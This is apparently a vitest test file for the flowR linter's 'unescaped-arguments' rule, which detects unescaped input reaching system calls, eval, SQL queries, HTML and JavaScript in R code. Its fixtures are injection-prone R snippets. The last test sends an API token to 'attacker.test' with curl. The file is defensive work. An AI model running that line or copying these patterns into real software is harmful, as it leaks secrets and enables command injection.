import { describe } from 'vitest';
import { withTreeSitter } from '../_helper/shell';
import { assertLinter, assertLinterFields, assertLintedLines } from '../_helper/linter';
import { LintingResultCertainty } from '../../../src/linter/linter-format';
import { SourceRange } from '../../../src/util/range';
import { InputTraceType, InputType } from '../../../src/queries/catalog/input-sources-query/simple-input-classifier';
import { UnescapedArgumentCategory } from '../../../src/linter/rules/unescaped-arguments';
import { decorateLabelContext, label } from '../_helper/label';

/** A shiny server function template with `input` from the user */
function shinyServer(body: string): string {
	return `library(shiny)\nserver <- function(input, output) {\n\t${body}\n}`;
}

describe('flowR linter', withTreeSitter(parser => {
	describe('Unescaped System Calls', () => {
		assertLinterFields(parser, 'x <- readline()\nctx <- if(u) V8::v8() else NULL\nctx$eval(x)\nhtmltools::tags$script(x)\nl <- list(eval = print)\nl$eval(x)\ntags <- list(script = print)\ntags$script(x)', 'unescaped-arguments', [
			{ certainty: LintingResultCertainty.Certain, category: UnescapedArgumentCategory.JavaScript, function: 'ctx$eval' },
			{ certainty: LintingResultCertainty.Certain, category: UnescapedArgumentCategory.JavaScript, function: 'htmltools::tags$script' }
		]);
		assertLinterFields(parser, 'x <- readline()\nf <- function() 1\nbody(f) <- parse(text = x)[[1]]\ntrace(print, tracer = parse(text = x))', 'unescaped-arguments', [
			{ certainty: LintingResultCertainty.Certain, function: 'body<-' },
			{ certainty: LintingResultCertainty.Certain, function: 'trace' }
		]);
		assertLinterFields(parser, 'x <- readline()\np <- purrr::partial(system, intern = TRUE)\np(x)\nf <- purrr::compose(system, toupper)\nf(x)', 'unescaped-arguments', [
			{ certainty: LintingResultCertainty.Certain, function: 'p', input: [InputType.User] },
			{ certainty: LintingResultCertainty.Certain, function: 'f', input: [InputType.User] }
		]);
		assertLinterFields(parser, 'f <- function(c = readline()) system(c)\nf()', 'unescaped-arguments', [
			{ certainty: LintingResultCertainty.Certain, input: [InputType.Parameter, InputType.User] }
		]);
		assertLinterFields(parser, '#* @get /run\nfunction(cmd) system(cmd)', 'unescaped-arguments', [
			{ certainty: LintingResultCertainty.Certain }
		]);
		assertLinter('constant command', parser, 'system("ls")', 'unescaped-arguments', []);
		assertLinter('escaped command', parser, 'system(shQuote(x))', 'unescaped-arguments', []);
		assertLinter('unknown command', parser, 'system(x)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.System,
			function:  'system',
			loc:       SourceRange.from(1, 8, 1, 8),
			sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Unknown] }],
			input:     [InputType.Unknown],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(1, 8, 1, 8),
				description: 'Escape the value with `shQuote`',
				replacement: 'shQuote(x)'
			}]
		}]);
		assertLinter('processx passes its arguments without a shell', parser, 'f <- function(d) processx::run("ls", d)', 'unescaped-arguments', []);
		assertLinter('system2 hands its arguments to a shell', parser, 'f <- function(d) system2("ls", d)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.System,
			function:  'system2',
			loc:       SourceRange.from(1, 32, 1, 32),
			sources:   [{ id: 6, trace: InputTraceType.Pure, types: [InputType.Parameter] }],
			input:     [InputType.Parameter],
			quickFix:  [{ type: 'replace', loc: SourceRange.from(1, 32, 1, 32), description: 'Escape the value with `shQuote`', replacement: 'shQuote(d)' }]
		}]);
		assertLinter('do.call with a constant function name', parser, 't <- lapply(1:3, function(i) data.frame(a = i))\ndo.call("rbind", t)', 'unescaped-arguments', []);
		assertLinter('do.call of a function the code defines', parser, 'f <- function(a, b) a - b\ndo.call(f, list(b = 1, a = 5))', 'unescaped-arguments', []);
		assertLinter('do.call of a function a package exports', parser, 'x <- 1\ndo.call(attr, list(x, "u"))', 'unescaped-arguments', []);
		assertLinter('do.call of a closure a factory made', parser, 'adder <- function(n) function(x) x + n\nadd2 <- adder(2)\ndo.call(add2, list(5))', 'unescaped-arguments', []);
		assertLinter('do.call with a function name from a parameter', parser, 'f <- function(fn) do.call(fn, list(1))', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.Eval,
			function:  'do.call',
			loc:       SourceRange.from(1, 27, 1, 28),
			sources:   [{ id: 4, trace: InputTraceType.Alias, types: [InputType.Parameter] }],
			input:     [InputType.Parameter]
		}]);
		assertLinter('pasted parameter', parser, 'f <- function(dir) system(paste0("ls ", dir))', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.System,
			function:  'system',
			loc:       SourceRange.from(1, 27, 1, 44),
			sources:   [{ id: 7, trace: InputTraceType.Pure, types: [InputType.Parameter] }],
			input:     [InputType.Parameter],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(1, 41, 1, 43),
				description: 'Escape the value with `shQuote`',
				replacement: 'shQuote(dir)'
			}]
		}]);
		assertLinter('pasted parameter with a constant and an unknown call', parser, 'f <- function(dir) system(paste0("ls ", dir))\nf("ls")\nf(x)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.System,
			function:  'system',
			loc:       SourceRange.from(1, 27, 1, 44),
			sources:   [{ id: 7, trace: InputTraceType.Alias, types: [InputType.Constant, InputType.Scope, InputType.Parameter] }],
			input:     [InputType.Scope, InputType.Parameter],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(1, 41, 1, 43),
				description: 'Escape the value with `shQuote`',
				replacement: 'shQuote(dir)'
			}]
		}]);
		assertLinter('pasted escaped parameter', parser, 'f <- function(dir) system(paste0("ls ", shQuote(dir)))', 'unescaped-arguments', []);
		assertLinter('partly escaped command', parser, 'f <- function(a, b) system(paste0("cp ", shQuote(a), " ", b))', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.System,
			function:  'system',
			loc:       SourceRange.from(1, 28, 1, 60),
			sources:   [{ id: 16, trace: InputTraceType.Pure, types: [InputType.Parameter] }],
			input:     [InputType.Parameter],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(1, 59, 1, 59),
				description: 'Escape the value with `shQuote`',
				replacement: 'shQuote(b)'
			}]
		}]);
		assertLinter('user input as command', parser, shinyServer('system(input$cmd)'), 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Certain,
			category:  UnescapedArgumentCategory.System,
			function:  'system',
			loc:       SourceRange.from(3, 9, 3, 17),
			sources:   [{ id: 15, trace: InputTraceType.Unknown, types: [InputType.User], name: 'cmd' }],
			input:     [InputType.User],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(3, 9, 3, 17),
				description: 'Escape the value with `shQuote`',
				replacement: 'shQuote(input$cmd)'
			}]
		}]);
		assertLinter('unknown arguments', parser, 'system2("ls", args = x)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.System,
			function:  'system2',
			loc:       SourceRange.from(1, 22, 1, 22),
			sources:   [{ id: 4, trace: InputTraceType.Unknown, types: [InputType.Unknown], name: 'args' }],
			input:     [InputType.Unknown],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(1, 22, 1, 22),
				description: 'Escape the value with `shQuote`',
				replacement: 'shQuote(x)'
			}]
		}]);
		assertLinter('redefined function', parser, 'system <- function(command) invisible(command)\nsystem(x)', 'unescaped-arguments', []);
		assertLintedLines('grouped arguments', parser, 'x <- readline()\nsystem({ x })\nsystem((x))', 'unescaped-arguments', [2, 3]);
		assertLintedLines('a call of an alias', parser, 's <- system\nx <- readline()\ns(x)', 'unescaped-arguments', [3]);
		assertLintedLines('a closure is checked where it runs the command', parser, 'x <- readline()\nlapply(x, function(e) system(e))', 'unescaped-arguments', [2]);
		assertLinter('a temporary path', parser, 'system(paste("cat", tempfile()))', 'unescaped-arguments', []);
		assertLinter('a number carries nothing to inject', parser, 'x <- readline()\nsystem(paste("head -n", as.integer(x)))', 'unescaped-arguments', []);
		assertLintedLines('cutting into an escaped value undoes the escape', parser, 'x <- readline()\nsystem(paste("ls", gsub("\'", "", shQuote(x))))', 'unescaped-arguments', [2]);
		assertLintedLines('code handed to a worker still runs', parser, 'x <- readline()\nf <- future::future(system(x))\nforeach::foreach(i = 1:2) %dopar% system(x)', 'unescaped-arguments', [2, 3]);
		assertLintedLines('a template interpolating an input within a function', parser, 'f <- function() { x <- readline(); shiny::HTML(glue::glue("<p>{x}</p>")) }', 'unescaped-arguments', [1]);
		assertLintedLines('the environment system2 prepends to the command', parser, 'system2("ls", env = paste0("X=", readline()))', 'unescaped-arguments', [1]);
		assertLintedLines('text turned into code for tidy evaluation', parser, 'q <- readline()\ndplyr::filter(mtcars, !!rlang::parse_expr(q))\nrlang::eval_tidy(rlang::parse_expr(q))', 'unescaped-arguments', [2, 3]);
	});

	describe('Unescaped Evaluation', () => {
		assertLinter('constant evaluation', parser, 'eval(parse(text = "1+1"))', 'unescaped-arguments', []);
		/* the code is the one the program spells out, a language object is no input by itself */
		assertLinter('constant code built from a quoted expression', parser, 'code <- deparse(quote(1 + 2))\ncode <- gsub("2", "3", code)\neval(parse(text = code))', 'unescaped-arguments', []);
		assertLinter('constant quoted expression', parser, 'eval(quote(1 + 2))', 'unescaped-arguments', []);
		assertLinter('a captured argument is code of the caller', parser, 'f <- function(x) { e <- substitute(x); eval(e) }\nf(y)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Certain,
			category:  UnescapedArgumentCategory.Eval,
			function:  'eval',
			loc:       SourceRange.from(1, 45, 1, 45),
			sources:   [{ id: 12, types: [InputType.Lang], trace: InputTraceType.Alias }],
			input:     [InputType.Lang]
		}]);
		assertLinter('bounded evaluation', parser, 'eval(parse(text = match.arg(x, c("a", "b"))))', 'unescaped-arguments', []);
		assertLinter('a count of file content carries nothing to inject', parser, 'eval(parse(text = length(readLines("a"))))', 'unescaped-arguments', []);
		assertLinter('constant code parsed from a string', parser, 'eval(str2lang("1+2"))', 'unescaped-arguments', []);
		assertLintedLines('sourced user input', parser, 'x <- readline()\nsource(x)', 'unescaped-arguments', [2]);
		assertLinter('constant symbol lookup', parser, 'get("x")', 'unescaped-arguments', []);
		assertLinter('constant symbol lookup of a known variable', parser, 'x <- 2\nget("x")', 'unescaped-arguments', []);
		assertLinter('constant symbol lookup with a folded name', parser, 'i <- "x"\nget(i)', 'unescaped-arguments', []);
		assertLinter('constant symbol tests', parser, 'exists("x")\nmget(c("a", "b"))\nmatch.fun("sum")', 'unescaped-arguments', []);
		assertLinter('symbol lookup of a parameter', parser, 'f <- function(n) get(n)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.Eval,
			function:  'get',
			loc:       SourceRange.from(1, 22, 1, 22),
			sources:   [{ id: 4, trace: InputTraceType.Pure, types: [InputType.Parameter] }],
			input:     [InputType.Parameter]
		}]);
		assertLinter('symbol lookup of user input', parser, shinyServer('get(input$n)'), 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Certain,
			category:  UnescapedArgumentCategory.Eval,
			function:  'get',
			loc:       SourceRange.from(3, 6, 3, 12),
			sources:   [{ id: 15, trace: InputTraceType.Unknown, types: [InputType.User], name: 'n' }],
			input:     [InputType.User]
		}]);
		assertLinter('unknown evaluation', parser, 'eval(parse(text = x))', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.Eval,
			function:  'eval',
			loc:       SourceRange.from(1, 6, 1, 20),
			sources:   [{ id: 3, trace: InputTraceType.Unknown, types: [InputType.Unknown], name: 'text' }],
			input:     [InputType.Unknown]
		}]);
	});

	describe('Unescaped Database Queries', () => {
		assertLinter('constant statement', parser, 'dbGetQuery(con, "SELECT * FROM t")', 'unescaped-arguments', []);
		assertLintedLines('a generic re-exported by a driver', parser, 'x <- readline()\nRSQLite::dbGetQuery(con, x)', 'unescaped-arguments', [2]);
		assertLinter('interpolated statement', parser,
			shinyServer('dbGetQuery(con, DBI::sqlInterpolate(con, "SELECT * FROM t WHERE x = ?x", x = input$x))'), 'unescaped-arguments', []);
		assertLinter('pasted user input', parser,
			shinyServer('dbGetQuery(con, paste0("SELECT * FROM t WHERE x = \'", input$x, "\'"))'), 'unescaped-arguments', [{
				certainty: LintingResultCertainty.Certain,
				category:  UnescapedArgumentCategory.Database,
				function:  'dbGetQuery',
				loc:       SourceRange.from(3, 18, 3, 68),
				sources:   [{ id: 20, trace: InputTraceType.Unknown, types: [InputType.User], name: 'x' }],
				input:     [InputType.User],
				quickFix:  [{
					type:        'replace',
					loc:         SourceRange.from(3, 56, 3, 62),
					description: 'Escape the value with `DBI::dbQuoteLiteral`',
					replacement: 'DBI::dbQuoteLiteral(con, input$x)'
				}]
			}]);
		assertLinter('statement built elsewhere', parser,
			'q <- paste0("SELECT * FROM t WHERE x = ", user)\ndbGetQuery(con, q)', 'unescaped-arguments', [{
				certainty: LintingResultCertainty.Uncertain,
				category:  UnescapedArgumentCategory.Database,
				function:  'dbGetQuery',
				loc:       SourceRange.from(2, 17, 2, 17),
				sources:   [{ id: 11, trace: InputTraceType.Alias, types: [InputType.Constant, InputType.Unknown, InputType.DerivedConstant] }],
				input:     [InputType.Unknown]
			}]);
	});

	describe('Unescaped HTML', () => {
		assertLinter('constant value', parser, shinyServer('HTML("<b>hi</b>")'), 'unescaped-arguments', []);
		assertLinter('escaped user input', parser, shinyServer('HTML(htmltools::htmlEscape(input$name))'), 'unescaped-arguments', []);
		assertLinter('pasted user input', parser, shinyServer('HTML(paste0("<b>", input$name, "</b>"))'), 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Certain,
			category:  UnescapedArgumentCategory.Html,
			function:  'HTML',
			loc:       SourceRange.from(3, 7, 3, 39),
			sources:   [{ id: 18, trace: InputTraceType.Unknown, types: [InputType.User], name: 'name' }],
			input:     [InputType.User],
			quickFix:  [{
				type:        'replace',
				loc:         SourceRange.from(3, 21, 3, 30),
				description: 'Escape the value with `htmltools::htmlEscape`',
				replacement: 'htmltools::htmlEscape(input$name)'
			}]
		}]);
	});

	describe('Unescaped JavaScript', () => {
		assertLinter('constant code', parser, shinyServer('shinyjs::runjs("alert(1)")'), 'unescaped-arguments', []);
		assertLinter('serialized user input', parser,
			shinyServer('shinyjs::runjs(paste0("alert(", jsonlite::toJSON(input$name), ")"))'), 'unescaped-arguments', []);
		assertLinter('pasted user input', parser,
			shinyServer('shinyjs::runjs(paste0("alert(\'", input$name, "\')"))'), 'unescaped-arguments', [{
				certainty: LintingResultCertainty.Certain,
				category:  UnescapedArgumentCategory.JavaScript,
				function:  'shinyjs::runjs',
				loc:       SourceRange.from(3, 17, 3, 51),
				sources:   [{ id: 18, trace: InputTraceType.Unknown, types: [InputType.User], name: 'name' }],
				input:     [InputType.User],
				quickFix:  [{
					type:        'replace',
					loc:         SourceRange.from(3, 35, 3, 44),
					description: 'Escape the value with `jsonlite::toJSON`',
					replacement: 'jsonlite::toJSON(input$name)'
				}]
			}]);
		assertLinter('unknown code', parser, 'shinyjs::runjs(x)', 'unescaped-arguments', [{
			certainty: LintingResultCertainty.Uncertain,
			category:  UnescapedArgumentCategory.JavaScript,
			function:  'shinyjs::runjs',
			loc:       SourceRange.from(1, 16, 1, 16),
			sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Unknown] }],
			input:     [InputType.Unknown]
		}]);
	});
	assertLintedLines(decorateLabelContext(label('security: unescaped into the command', ['name-normal', 'function-calls']), ['dataflow']), parser, 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))', 'unescaped-arguments', [2]);
}));
